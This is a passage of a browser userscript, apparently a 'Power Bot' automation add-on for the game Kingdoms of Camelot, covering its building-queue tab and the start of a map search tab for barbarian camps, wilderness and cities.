        var buildingId = parseInt(bQi.buildingId);
        var buildingLevel = parseInt(bQi.buildingLevel);
        var buildingType = parseInt(bQi.buildingType);
        var buildingTime = parseInt(bQi.buildingTime);
        var buildingMult = parseInt(bQi.buildingMult);
        var buildingAttempts = parseInt(bQi.buildingAttempts);
        var buildingMode = bQi.buildingMode;
        t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts + 1, buildingMult, buildingMode); // requeue item
        t.cancelQueueElement(0, cityId, buildingTime, false); // delete Queue Item
    },
    show: function () {
        var t = Tabs.build;
    },
    bot_buildslot: function (c, a) {
        var t = Tabs.build;
        var cityId = t.getCurrentCityId();
        var buildingPos = c.id.split("_")[1];
        var buildingType = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][0]);
        var buildingLevel = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
        var buildingId = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][3]);
        if (DEBUG_TRACE) logit("Pos: " + buildingPos + " Type: " + buildingType + " Level: " + buildingLevel + " Id: " + buildingId);
        var buildingAttempts = 0;
        var loaded_bQ = t["bQ_" + cityId];
        if (typeof Seed.queue_con['city' + cityId][0] != 'undefined') {
            var current_construction_pos = Seed.queue_con['city' + cityId][0][2];
        } else {
            var current_construction_pos = "";
        }
        if (loaded_bQ.length == 0 && current_construction_pos != "") { //check anyway if there is currently build in progess for this specific building
            if (current_construction_pos != 'NaN' && current_construction_pos == buildingId) {
                buildingLevel += 1;
            }
        } else {
            if (current_construction_pos != "" && current_construction_pos == buildingId) {
                buildingLevel += 1;
            }
            for (var i = 0; i < loaded_bQ.length; i++) { // check if there are already queue items for this building or the building is currently building
                var loadedCity = loaded_bQ[i].cityId;
                var loadedSlot = loaded_bQ[i].buildingPos;
                if (loadedSlot == buildingPos && loadedCity == cityId) {
                    buildingLevel += 1;
                }
                if (loaded_bQ[i].buildingMode == 'destruct' && loadedSlot == buildingPos && loadedCity == cityId) { // check if destrcution is already in queue
                    t.modalmessage(translate("Destruction already in Queue!"));
                    return;
                }
            }
        }
        if (t.currentBuildMode == "build") {
            if (buildingLevel >= 9) {
                t.modalmessage(translate('Due to building requirements (DI), buildings above level 9\nshould be manualy built.'));
                return;
            }
            var buildingMode = "build";
            var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
            var buildingMult = result[0];
            var buildingTime = result[1];
            var queueId = loaded_bQ.length;
            t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
            t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
        if (t.currentBuildMode == "max") {
            var buildingMode = "build";
            for (var bL = buildingLevel; bL < 9; bL++) {
                var queueId = loaded_bQ.length;
                var result = t.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId;
                t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult, buildingMode);
                t._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
            }
        }
        if (t.currentBuildMode == "destruct") {
            var buildingMode = "destruct";
            var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
            var buildingMult = result[0];
            var buildingTime = result[1];
            var queueId = loaded_bQ.length;
            t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
            t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
    },
    calculateQueueValues: function (cityId, buildingLevel, buildingType, buildingMode) {
        var t = Tabs.build;
        var now = unixTime();
        var constructionBoost = unsafeWindow.cm.ThroneController.effectBonus(78);
        if (buildingMode == 'build') {
            var buildingMult = Math.pow(2, buildingLevel);
        }
        if (buildingMode == 'destruct') {
            var buildingMult = Math.pow(2, buildingLevel - 2);
        }
        var knights = Seed.knights["city" + cityId];
        if (knights) {
            var polKniId = parseInt(Seed.leaders['city' + cityId].politicsKnightId);
            if (polKniId) {
                var polValue = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politics);
                var polBoost = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politicsBoostExpireUnixtime);
                if ((polBoost - now) > 0) {
                    polValue = parseInt(polValue * 1.25);
                }
            } else {
                polValue = 0;
            }
        } else {
            polValue = 0;
        }
        var buildingTime = unsafeWindow.buildingcost["bdg" + buildingType][7] * buildingMult;
        if (parseInt(buildingType) < 6 && parseInt(buildingType) > 0 && buildingMult == 1) {
            buildingTime = 15;
        }
        if (buildingMode == 'build') {
            buildingTime = parseInt(buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16)));
            if (constructionBoost > 0) buildingTime = Math.round(buildingTime / (1 + (constructionBoost / 100)));
        }
        if (buildingMode == 'destruct') {
            buildingTime = buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16));
            if (buildingTime % 1 > 0) {
                buildingTime = parseInt(buildingTime);
            }
        }
        var result = new Array(buildingMult, buildingTime);
        return result;
    },
    bot_buildguardian: function (c, a) {
        var t = Tabs.build;
        var cityId = t.getCurrentCityId();
        var buildingType = 50;
        for (i = 0; i < Cities.numCities; i++) {
            if (Seed.guardian[i].cityId == cityId) {
                var buildingLevel = Seed.guardian[i].level;
                break;
            }
        }
        var buildingId = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][3]);
        if (DEBUG_TRACE) logit("Pos: " + buildingPos + " Type: " + buildingType + " Level: " + buildingLevel + " Id: " + buildingId);
        var buildingAttempts = 0;
        var loaded_bQ = t["bQ_" + cityId];
        if (typeof Seed.queue_con['city' + cityId][0] != 'undefined') {
            var current_construction_pos = Seed.queue_con['city' + cityId][0][2];
        } else {
            var current_construction_pos = "";
        }
        if (loaded_bQ.length == 0 && current_construction_pos != "") { //check anyway if there is currently build in progess for this specific building
            if (current_construction_pos != 'NaN' && current_construction_pos == buildingId) {
                buildingLevel += 1;
            }
        } else {
            if (current_construction_pos != "" && current_construction_pos == buildingId) {
                buildingLevel += 1;
            }
            for (var i = 0; i < loaded_bQ.length; i++) { // check if there are already queue items for this building or the building is currently building
                var loadedCity = loaded_bQ[i].cityId;
                var loadedSlot = loaded_bQ[i].buildingPos;
                if (loadedSlot == buildingPos && loadedCity == cityId) {
                    buildingLevel += 1;
                }
                if (loaded_bQ[i].buildingMode == 'destruct' && loadedSlot == buildingPos && loadedCity == cityId) { // check if destrcution is already in queue
                    t.modalmessage(translate("Destruction already in Queue!"));
                    return;
                }
            }
        }
        if (t.currentBuildMode == "build") {
            if (buildingLevel >= 9) {
                t.modalmessage(translate('Due to building requirements (DI), buildings above level 9\nshould be manualy built.'));
                return;
            }
            var buildingMode = "build";
            var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
            var buildingMult = result[0];
            var buildingTime = result[1];
            var queueId = loaded_bQ.length;
            t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
            t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
        if (t.currentBuildMode == "max") {
            var buildingMode = "build";
            for (var bL = buildingLevel; bL < 9; bL++) {
                var queueId = loaded_bQ.length;
                var result = t.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId;
                t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult, buildingMode);
                t._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
            }
        }
        if (t.currentBuildMode == "destruct") {
            var buildingMode = "destruct";
            var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
            var buildingMult = result[0];
            var buildingTime = result[1];
            var queueId = loaded_bQ.length;
            t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
            t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
    },
    bot_gethelp: function (f, currentcityid, time, retry) {
        var t = Tabs.build;
        var city = t.getCityNameById(currentcityid);
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        if (retry>3) return;  //dont want to get stuck in a loop of failures
        params.bid = f;
        params.ctrl = 'AskForHelp';
        params.action = 'getHelpData';
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function (rslt) {
				
                 if (rslt.updateSeed)
					unsafeWindow.update_seed(rslt.updateSeed);
                unsafeWindow.handleHelpCallback(rslt.data);
            },
            onFailure: function (rslt) {
                logit('Build help request failure, retry '+retry);
				t.bot_gethelp(f, currentcityid, time, retry+1);
                return;
            },
        });
		//only post build to FB if they take at least an hour
        if (time > 3600) {
			var a = Seed.queue_con["city" + currentcityid];
			var e = 0;
			var d = 0;
			for (var c = 0; c < a.length; c++) {
				if (parseInt(a[c][2]) == parseInt(f)) {
					e = parseInt(a[c][0]);
					d = parseInt(a[c][1]);



					break
				}
			}
			var b = new Array();
			b.push(["REPLACE_LeVeLbUiLdInG", d]);
			b.push(["REPLACE_BuIlDiNgNaMe", unsafeWindow.buildingcost["bdg" + e][0]]);
			b.push(["REPLACE_LeVeLiD", d]);
			b.push(["REPLACE_AsSeTiD", f]);
			var g = function (h, i) {
				unsafeWindow.continuation_95(h, i);

				if (!h) {
					var j = d > 1 ? unsafeWindow.cm.SpeedUpType.upgrade : unsafeWindow.cm.SpeedUpType.build;
					unsafeWindow.cm.ClientSideCookieManager.setCookie(j, false)


				}
			};		
			unsafeWindow.common_postToProfile("95", unsafeWindow.Object.cloneFeed(unsafeWindow.template_data_95), unsafeWindow.Object.cloneFeed(unsafeWindow.actionlink_data_95), g, b);
		}
    },
    addQueueItem: function (cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode) {
        var t = Tabs.build;
        var lbQ = t["bQ_" + cityId];
        lbQ.push({
            cityId: cityId,
            buildingPos: buildingPos,
            buildingType: buildingType,
            buildingId: buildingId,
            buildingTime: buildingTime,
            buildingLevel: buildingLevel,
            buildingAttempts: buildingAttempts,
            buildingMult: buildingMult,
            buildingMode: buildingMode
        });
        t.modifyTotalTime(cityId, 'increase', buildingTime); //adjust total Time
    },
    modalmessage: function (message) {
        var t = Tabs.build;
        var timeout = 10000;
        var content = translate("autoclose after 10sec") + "...<br><br>"
        content += message;
        unsafeWindow.Modal.showAlert(content);
        window.setTimeout('unsafeWindow.Modal.hideModal();', timeout);
    },
    modifyTotalTime: function (cityId, type, buildingTime) {
        var t = Tabs.build;
        var element = document.getElementById('pbbuildcount_' + cityId);
        var currentCount = parseInt(element.innerHTML);
        if (type == "increase") {
            t['totalTime_' + cityId] = t['totalTime_' + cityId] + buildingTime;
            var currentCount = currentCount + 1;
        }
        if (type == "decrease") {
            t['totalTime_' + cityId] = t['totalTime_' + cityId] - buildingTime;
            var currentCount = currentCount - 1;
        }
        element.innerHTML = currentCount;
        document.getElementById('pbbuildtotal_' + cityId).innerHTML = timestr(t['totalTime_' + cityId]);
    },
    hide: function () {
        var t = Tabs.build;
        //unsafeWindow.buildslot = t.koc_buildslot; // restore original koc function
    },
    onUnload: function () {
        var t = Tabs.build;
        for (var i = 0; i < Cities.cities.length; i++) {
            //t["bQ_" + Cities.cities[i].id] = []; //clean up if needed
            if (!ResetAll) GM_setValue('bQ_' + getServerId() + '_' + Cities.cities[i].id, JSON2.stringify((t["bQ_" + Cities.cities[i].id])));
        }
        t.saveBuildStates();
    },
    _addTab: function (queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode) {
        var t = Tabs.build;
        var row = document.getElementById('pbCityQueueContent').insertRow(0);
        row.vAlign = 'top';
        row.insertCell(0).innerHTML = queueId;
        if (buildingMode == "destruct") {
            row.insertCell(1).innerHTML = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/bonus_att.png">';
        } else {
            row.insertCell(1).innerHTML = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/bonus_prod.png">';
        }
        row.insertCell(2).innerHTML = unsafeWindow.buildingcost['bdg' + buildingType][0];
        row.insertCell(3).innerHTML = timestr(buildingTime);
        if (buildingMode == "destruct") {
            row.insertCell(4).innerHTML = 0;
        } else {
            row.insertCell(4).innerHTML = buildingLevel + 1; // => target Level
        }
        row.insertCell(5).innerHTML = buildingAttempts;
        row.insertCell(6).innerHTML = '<a class="button20" id="queuecancel_' + queueId + '"><span>Cancel</span></a>';
        document.getElementById('queuecancel_' + queueId).addEventListener('click', function () {
            t.cancelQueueElement(queueId, cityId, buildingTime, true);
        }, false);
    },
    cancelQueueElement: function (queueId, cityId, buildingTime, showQueue) {
        var t = Tabs.build;
        var queueId = parseInt(queueId);
        t["bQ_" + cityId].splice(queueId, 1);
        t.modifyTotalTime(cityId, 'decrease', buildingTime); //adjust total Time    
        if (showQueue == true) {
            t.showBuildQueue(cityId, false);
        }
    },
    showBuildQueue: function (cityId, focus) {
        var t = Tabs.build;
        clearTimeout(t.timer);
        var popBuildQueue = null;
        var cityName = t.getCityNameById(cityId);
        if (t.popBuildQueue == null) {
            t.popBuildQueue = new pbPopup('pbbuild_' + cityId, 0, 0, 350, 500, true, function () {
                clearTimeout(t.timer);
            });
        }
        var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbTabPad" id="pbCityQueueContent">';
        t.popBuildQueue.getMainDiv().innerHTML = '</table></div>' + m;
        t.popBuildQueue.getTopDiv().innerHTML = '<TD width="200px"><B>' + translate("Build Queue of") + ' ' + cityName + '</b></td><TD><INPUT id=pbOptimizeByTime type=submit value="' + translate("Optimize by Time") + '"></td>';
        t.paintBuildQueue(cityId);
        if (focus) t.popBuildQueue.show(true);
        document.getElementById('pbOptimizeByTime').addEventListener('click', function () {
            t.clearBuildQueue();
            t.paintBuildQueue(cityId, true);
        }, false);
        t.timer = setTimeout(function () {
            t.showBuildQueue(cityId, false)
        }, 45000);
    },
    paintBuildQueue: function (cityId, optimize) {
        var t = Tabs.build;
        var lbQ = t["bQ_" + cityId];
        if (optimize == true) {
            lbQ.sort(function (a, b) {
                return a.buildingTime - b.buildingTime
            });
        }
        t["bQ_" + cityId] = lbQ;
        for (var i = 0; i < lbQ.length; i++) {
            var queueId = i;
            t._addTab(queueId, lbQ[i].cityId, lbQ[i].buildingType, lbQ[i].buildingTime, lbQ[i].buildingLevel, lbQ[i].buildingAttempts, lbQ[i].buildingMode);
        }
    },
    clearBuildQueue: function () {
        var t = Tabs.build;
        var table = document.getElementById('pbCityQueueContent');
        var rows = table.rows;
        while (rows.length)
        table.deleteRow(rows.length - 1);
    },
    getCurrentCityId: function () { // TODO maybe move as global function to the core application
        if (!unsafeWindow.currentcityid) return null;
        return unsafeWindow.currentcityid;
    },
    saveBuildStates: function () {
        var t = Tabs.build;
        var serverID = getServerId();
        GM_setValue('buildStates_' + serverID, JSON2.stringify(t.buildStates));
    },
    readBuildStates: function () {
        var t = Tabs.build;
        var serverID = getServerId();
        s = GM_getValue('buildStates_' + serverID);
        if (s != null) {
            states = JSON2.parse(s);
            for (k in states)
            t.buildStates[k] = states[k];
        }
    },
    toggleStateRunning: function (obj) {
        var t = Tabs.build;
        if (t.buildStates.running == true) {
            t.buildStates.running = false;
            t.saveBuildStates();
            obj.value = translate("Construction AUTO = OFF");
        } else {
            t.buildStates.running = true;
            t.saveBuildStates();
            obj.value = translate("Construction AUTO = ON");
        }
    },
    toggleStateMode: function (obj) {
        var t = Tabs.build;
        if (obj.value == translate('Construction AUTO = OFF')) {
            unsafeWindow.buildslot = t.bot_buildslot; // overwrite original koc function
            var guardian = document.getElementById('citymap').getElementsByClassName('bldg_guardian_0');
            if (guardian.length > 0) guardian[0].addEventListener('click', t.bot_buildguardian, false);
            obj.value = translate("Construction AUTO = ON");
        } else {
            unsafeWindow.buildslot = t.koc_buildslot; // restore original koc function
            var guardian = document.getElementById('citymap').getElementsByClassName('bldg_guardian_0');
            if (guardian.length > 0) guardian[0].removeEventListener('click', t.bot_buildguardian, false);
            obj.value = translate("Construction AUTO = OFF");
        }
    },
    getCityNameById: function (cityId) {
        return Cities.byID[cityId].name;
    },
}

/********************************* Search Tab *************************************/

/***
TODO: Better search algorithm (circular OR square, always start at center, working outwards)
        Should be separate class (producer/consumer) so auto attack can use it too
**/

Tabs.Search = {
  tabOrder : 50,
    tabDisabled : !ENABLE_SAMPLE_TAB,
  myDiv : null,
  MapAjax : new CMapAjax(),
  MAX_SHOW_WHILE_RUNNING : 250,
  popFirst : true,
  SearchList : [],
  
  init : function (div){
    var t = Tabs.Search;
    var Provinces = {1:{'name':"Tintagel",'x':75,'y':75},
                2:{'name':"Cornwall",'x':225,'y':75},
                3:{'name':"Astolat",'x':375,'y':75},
                4:{'name':"Lyonesse",'x':525,'y':75},
                5:{'name':"Corbenic",'x':675,'y':75},

                6:{'name':"Paimpont",'x':75,'y':225},
                7:{'name':"Cameliard",'x':225,'y':225},
                8:{'name':"Sarras",'x':375,'y':225},
                9:{'name':"Canoel",'x':525,'y':225},
                10:{'name':"Avalon",'x':675,'y':225},

                11:{'name':"Carmathen",'x':75,'y':375},
                12:{'name':"Shallot",'x':225,'y':375},
                //13:{'name':"-------",'x':375,'y':375},
                14:{'name':"Cadbury",'x':525,'y':375},
                15:{'name':"Glastonbury",'x':675,'y':375},

                16:{'name':"Camlamn",'x':75,'y':525},
                17:{'name':"Orkney",'x':225,'y':525},
                18:{'name':"Dore",'x':375,'y':525},
                19:{'name':"Logres",'x':525,'y':525},
                20:{'name':"Caerleon",'x':675,'y':525},

                21:{'name':"Parmenie",'x':75,'y':675},
                22:{'name':"Bodmin Moor",'x':225,'y':675},
                23:{'name':"Cellwig",'x':375,'y':675},
                24:{'name':"Listeneise",'x':525,'y':675},
                25:{'name':"Albion",'x':675,'y':675}};
    t.selectedCity = Cities.cities[0];
    t.myDiv = div;
    
    m = '<DIV class=pbentry><TABLE width=100% class=pbTab><TR><TD class=pbDetLeft>'+translate("Search for")+': </td><TD width=99%>';
    m += htmlSelector ({0:translate("Barb Camp"), 1:translate("Wilderness"), 2:translate("Cities")}, null, 'id=pasrcType');
    m += '&nbsp; &nbsp; &nbsp; <span class=pbDetLeft>'+translate("Search style")+': &nbsp;';
    m += htmlSelector({square:translate("Square"), circle:translate("Circle")}, Options.srcdisttype, 'id=pbsrcdist');
    m += '</span></td></tr><TR><TD class=pbDetLeft>'+translate("At")+': </td><TD class=xtab>X=<INPUT id=pasrchX type=text\> &nbsp;Y=<INPUT id=pasrchY type=text\>\
      &nbsp; '+translate("Radius")+': <INPUT id=pasrcDist size=3 value=10 /> &nbsp; <SPAN id=paspInXY></span></tr>\
      <TR><TD class=pbDetLeft>Or:</td><TD>'+translate("Search entire province")+': <select id="provinceXY"><option>--'+translate("provinces")+'--</option>';
    for (var i in Provinces)
        m += '<option value="'+i+'">'+Provinces[i].name+'</option>';
    m += '</select></td></tr>';
    m += '<TR><TD colspan=2 align=center><INPUT id=pasrcStart type=submit value="'+translate("Start Search")+'"/></td></tr>';
    m += '</table></div>\
        <DIV id="pasrcResults" style="height:400px; max-height:400px;"></div>';
    
    t.myDiv.innerHTML = m;
    var psearch = document.getElementById ("pasrcType");
    new CdispCityPicker ('pasrchdcp', document.getElementById ('paspInXY'), true, t.citySelNotify).bindToXYboxes(document.getElementById ('pasrchX'), document.getElementById ('pasrchY'));
    document.getElementById ('provinceXY').addEventListener ('click', function() {
          if (this.value >= 1) {
              document.getElementById ('pasrchX').value = Provinces[this.value].x;
              document.getElementById ('pasrchY').value = Provinces[this.value].y;
              document.getElementById ('pasrcDist').value = '75';
          }
        }, false);
    document.getElementById('pbsrcdist').addEventListener ('change', function (){
      Options.srcdisttype = document.getElementById('pbsrcdist').value;
      saveOptions();
      }, false);
    document.getElementById ('pasrcStart').addEventListener ('click', t.clickedSearch, false);
    document.getElementById ('pasrchX').addEventListener ('keydown', t.e_coordChange, false);
    document.getElementById ('pasrchY').addEventListener ('keydown', t.e_coordChange, false);
    document.getElementById ('pasrcDist').addEventListener ('keydown', t.e_coordChange, false);
    document.getElementById ('pasrchY').addEventListener ('change', t.e_coordChange, false);
    document.getElementById ('pasrchY').addEventListener ('change', t.e_coordChange, false);
    unsafeWindow.pbSearchLookup = t.clickedLookup;  
    unsafeWindow.pbSearchScout = t.clickedScout;
    unsafeWindow.pbExportToRaid = t.ExportToRaid;
  },

  e_coordChange : function(){
    document.getElementById ('provinceXY').selectedIndex = 0;
  },
  
  hide : function (){
  },

  show : function (cont){
  },

  citySelNotify : function (city){
    var t = Tabs.Search;
    t.selectedCity = city;
    t.JumpCity(city.name);
  },
  
  JumpCity:function(city) {
    var t = Tabs.Search;
    for (i=0;i<Seed.cities.length;i++) {
        if (Seed.cities[i][1]==city) var cityNum=i;
    }
    cityNum++;
    var obj = document.getElementById('citysel_'+cityNum);
      return t.ClickWin(window,obj,'click');
  },
  
  ClickWin:function(win,obj,evtName) {
      var evt = win.document.createEvent("MouseEvents");
      evt.initMouseEvent(evtName, true, true, win,
          0, 0, 0, 0, 0, false, false, false, false, 0, null);
      return !obj.dispatchEvent(evt);
  },
  
  helpPop : function (){
       var helpText = translate("Raids_Help");
       helpText += '<A target="_tab" href="http://koc.wikia.com/wiki/Barbarian_Camps">A lot more can be found on Koc Wikia</a>';
       helpText += '<TABLE><TR><TD>Lvl</td><TD>Troops</td></tr>';
       helpText += '<TR><TD>1</td><TD>500 Supply Troops + 500 Archers</td></tr>';
       helpText += '<TR><TD>2</td><TD>500 Supply Troops + 2500 Archers</td></tr>';
       helpText += '<TR><TD>3</td><TD>500 Supply Troops + 5000 Archers</td></tr>';
       helpText += '<TR><TD>4</td><TD>500 Supply Troops + 7500 Archers</td></tr>';
       helpText += '<TR><TD>5</td><TD>15000 Archers</td></tr>';
       helpText += '<TR><TD>5</td><TD>12000 Archers IF Level 10 fletching and Level 9 Featherweight</td></tr>';
       helpText += '<TR><TD>6</td><TD>25000 Archers IF Level 9 fletching</td></tr>';
       helpText += '<TR><TD>6</td><TD>22000 Archers IF Level 10 fletching</td></tr>';
       helpText += '<TR><TD>7</td><TD>45000 Archers IF Level 10 fletching</td></tr>';
       helpText += '<TR><TD>7</td><TD>44000 Archers IF Level 10 fletching and knight 69+</td></tr>';
       helpText += '<TR><TD>7</td><TD>40000 Archers IF Level 10 fletching and knight 94+</td></tr>';
       helpText += '<TR><TD>8</td><TD>28000 Ballista WITH Level 10 fletching and Knight 91+</td></tr>';
       helpText += '<TR><TD>9</td><TD>56000 Ballista WITH Level 10 fletching and Knight 98+</td></tr>';
       helpText += '<TR><TD>10</td><TD>125000 Catapults (500 Catapults loss!)</td></tr></tr></table>';
  
  
       var pop = new pbPopup ('giftHelp', 0, 0, 425, 375, true);
       pop.centerMe (mainPop.getMainDiv());  
       pop.getMainDiv().innerHTML = helpText;
       pop.getTopDiv().innerHTML = '<CENTER><B>Power Bot '+translate("Help")+': '+translate("Raids")+'</b></center>';
       pop.show (true);
     },
     
     
  opt : {},
  selectedCity : null,
  searchRunning : false,
  tilesSearched : 0,
  tilesFound : 0,
  curX : 0,
  curY : 0,
  lastX : 0,
  firstX : 0,
  firstY : 0,
  lastY : 0,

  clickedSearch : function (){
    var t = Tabs.Search;

    if (t.searchRunning){
      t.stopSearch (translate('SEARCH CANCELLED!'));
      return;
    }
    t.opt.searchType = document.getElementById ('pasrcType').value;
    t.opt.startX = parseInt(document.getElementById ('pasrchX').value);
    t.opt.startY = parseInt(document.getElementById ('pasrchY').value);
    t.opt.maxDistance = parseInt(document.getElementById ('pasrcDist').value);
    t.opt.searchShape = Options.srcdisttype;
    errMsg = '';

    if (isNaN (t.opt.startX) ||t.opt.startX<0 || t.opt.startX>749)
      errMsg = "X "+translate("must be between 0 and 749")+"<BR>";
    if (isNaN (t.opt.startY) ||t.opt.startY<0 || t.opt.startY>749)
      errMsg += "Y "+translate("must be between 0 and 749")+"<BR>";
    if (isNaN (t.opt.maxDistance) ||t.opt.maxDistance<1 || t.opt.maxDistance>75)
      errMsg += translate("Radius (distance) must be between")+" 1 +"+translate("and")+" 75<BR>";
    if (errMsg != ''){
      document.getElementById('pasrcResults').innerHTML = '<FONT COLOR=#660000>'+translate("ERROR")+':</font><BR><BR>'+ errMsg;
      return;
    }

    t.searchRunning = true;
    document.getElementById ('pasrcStart').value = translate('Stop Search');
    m = '<DIV class=pbStat><TABLE width=100% cellspacing=0><TR><TD class=xtab width=125><DIV id=pastatSearched></div></td>\
        <TD class=xtab align=center><SPAN style="white-space:normal" id=pastatStatus></span></td>\
        <TD class=xtab align=right width=125><DIV id=pastatFound></div></td></tr></table></div>\
          <TABLE width=100%><TR valign=top>\
            <TD width=99% style="max-width:50px"><DIV id=padivOutTab style="height:380px; max-height:380px; overflow-y:auto;"></div></td>\
            <TD align=center valign=middle><A id=pbAhideShow style="text-decoration:none; cursor:pointer;"><DIV style="width:1em; border:1px solid red; padding:10px 2px; background-color:#fee"><SPAN id=spanHideShow> '+translate("H I D E")+'</span><BR><BR> '+translate("L<BR>I<BR>S<BR>T<BR><BR> O<BR>P<BR>T<BR>I<BR>O<BR>N<BR>S")+' </div></a></td>\
            <TD width=100% height=100% style="background:#e0e0f0; height:100%; padding:5px"><DIV id=padivOutOpts></div></td>\
          </table>';
      
    document.getElementById('pasrcResults').innerHTML = m;
    if (t.opt.searchType == 0)
      var typeName = translate('Barbarians');
    else if (t.opt.searchType == 1)
      var typeName = translate('Wildernesses');
    else
      var typeName = translate('Cities');
    if (t.opt.searchShape == 'square')
      var distName = translate('Distance');
    else
      var distName = translate('Radius');
    m = '<CENTER><B>'+translate("Search for")+' '+ typeName +'<BR>\
        '+translate("Center")+': '+ t.opt.startX +','+ t.opt.startY +'  &nbsp; '+ distName +': '+ t.opt.maxDistance +'<BR></center>\
        <DIV class=pbentry><TABLE cellspacing=0 width=100%><TR align=center><TD class=xtab colspan=10><B>'+translate("LIST OPTIONS")+':</b><BR></td></tr>';
        
    if (t.opt.searchType == 1 || t.opt.searchType == 0) {
      m += '<TR><TD class=xtab align=right>'+translate("Min")+". "+translate("level to show")+':</td><TD class=xtab> <INPUT id=pafilMinLvl size=2 value='+ Options.srcMinLevel +' /></td></tr>\
        <TR><TD class=xtab align=right>'+translate("Max")+". "+translate("level to show")+':</td><TD class=xtab> <INPUT id=pafilMaxLvl size=2 value='+ Options.srcMaxLevel +' /></td></tr>';
        }
    if (t.opt.searchType == 1){
      m += '<TR><TD class=xtab align=right>'+translate("Wilderness Type")+':</td><TD class=xtab><SELECT id=pafilWildType>';
      m += htmlOptions ( {1:translate('Grassland/Lake'), 3:translate('Woodlands'), 4:translate('Hills'), 5:translate('Mountain'), 6:translate('Plain'), 8:translate('Dark Forest'), 0:translate('ALL')}, Options.wildType );
      m+= '</select></td></tr>';
      // m+= '<TR><TD class=xtab align=right>Grassland/Lake:</td><TD class=xtab><INPUT name=pbfil id=pafilGrass type=CHECKBOX '+ (Options.GrassOnly?' CHECKED':'') +'\><td></tr>';
      // m+= '<TR><TD class=xtab align=right>Woodlands:</td><TD class=xtab><INPUT name=pbfil id=pafilWood type=CHECKBOX '+ (Options.WoodOnly?' CHECKED':'') +'\><td></tr>';
      // m+= '<TR><TD class=xtab align=right>Hills:</td><TD class=xtab><INPUT name=pbfil id=pafilHill type=CHECKBOX '+ (Options.HillOnly?' CHECKED':'') +'\><td></tr>';
      // m+= '<TR><TD class=xtab align=right>Mountain:</td><TD class=xtab><INPUT name=pbfil id=pafilMount type=CHECKBOX '+ (Options.MountOnly?' CHECKED':'') +'\><td></tr>';
      // m+= '<TR><TD class=xtab align=right>Plain:</td><TD class=xtab><INPUT name=pbfil id=pafilPlain type=CHECKBOX '+ (Options.PlainOnly?' CHECKED':'') +'\><td></tr>';
      // m+= '<TR><TD class=xtab align=right>All:</td><TD class=xtab><INPUT name=pbfil id=pafilAll type=CHECKBOX '+ (Options.srcAll?' CHECKED':'') +'\><td></tr>';
      m += '</select></td></tr><TR><TD class=xtab align=right>'+translate("Unowned Only")+':</td><TD class=xtab><INPUT id=pafilUnowned type=CHECKBOX '+ (Options.unownedOnly?' CHECKED':'') +'\><td></tr>';
    }
   if (t.opt.searchType == 1 || t.opt.searchType == 0) {
        m+= '<TR><TD class=xtab align=right>Sort By:</td><TD class=xtab><SELECT id=pafilSortBy>\
          <OPTION value="level" '+ (Options.srcSortBy=='level'?'SELECTED':'')  +'>'+translate("Level")+'</option>\
          <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>'+translate("Distance")+'</option>\
            </select></td></tr>\
            <TR><TD class=xtab align=right>'+translate("Coordinates only")+':</td><TD class=xtab><INPUT type=checkbox id=pacoordsOnly \></td></tr>\
            </table></div><BR><SPAN id=pasrchSizeWarn></span><DIV id=pbSrcExp></div>';
    } else {
        m+= '</select></td></tr><TR><TD class=xtab align=right>'+translate("Misted")+':</td><TD class=xtab><INPUT name=pbfil id=pafilMisted type=CHECKBOX '+ (Options.mistedOnly?' CHECKED':'') +'\><td></tr>';
        m+= '<TR><TD class=xtab align=right>'+translate("Hostile")+':</td><TD class=xtab><INPUT name=pbfil id=pafilHostile type=CHECKBOX '+ (Options.hostileOnly?' CHECKED':'') +'\><td></tr>';
